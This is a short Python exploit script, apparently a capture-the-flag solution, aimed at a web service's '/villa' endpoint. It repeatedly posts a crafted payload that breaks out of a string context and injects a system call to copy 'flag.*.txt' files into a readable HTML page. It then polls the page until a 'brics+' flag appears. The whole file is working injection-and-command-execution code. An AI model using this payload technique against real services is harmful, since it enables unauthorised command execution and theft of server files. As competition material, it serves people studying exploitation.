#!/usr/bin/env python3

import sys
import time
import requests

HOST = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 17171

URL = f'http://{HOST}:{PORT}/villa'

while True:
    try:
        payload = "\n. '); C.system('cat flag.*.txt > villa.html'.str); println(' {\n"
        requests.post(URL, data = payload)

        response = requests.get(URL)
        print(response.content)

        if b'brics+' in response.content:
            break
    except Exception as e:
        print(e)

    time.sleep(2)
